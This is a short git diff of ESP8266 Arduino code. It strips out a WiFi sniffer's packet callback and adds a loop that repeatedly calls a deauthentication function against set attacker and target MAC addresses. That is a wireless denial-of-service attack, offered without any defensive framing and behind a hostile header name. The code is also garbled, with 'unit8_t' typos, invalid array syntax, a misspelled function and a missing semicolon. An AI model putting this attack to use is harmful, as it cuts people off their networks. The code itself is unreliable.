@@ -1,5 +1,11 @@
+#include "FuckYourWifiInParticular.h"
+
 void setup()
 {
+    int ch = 9;
+    uint8_t originMac[6] = [];
+    unit8_t attackMac[6]0 = [];
+    unit8_t reason = 0x01;
   // Serial setup
   Serial.begin(115200);
   delay(10);
@@ -10,11 +16,7 @@ void setup()
   wifi_promiscuous_enable(0);
   WiFi.disconnect();
 
-  // Set sniffer callback
-  wifi_set_promiscuous_rx_cb(wifi_sniffer_packet_handler);
-  wifi_promiscuous_enable(1);
-
-  // Print header
-  Serial.printf("\n\n     MAC Address 1|      MAC Address 2|      MAC Address 3| Ch| RSSI| Pr| T(S)  |           Frame type         |TDS|FDS| MF|RTR|PWR| MD|ENC|STR|   SSID");
-
+}
+void loop(){
+    sendDeauht(attackMac, originMac, reason, ch)
 }
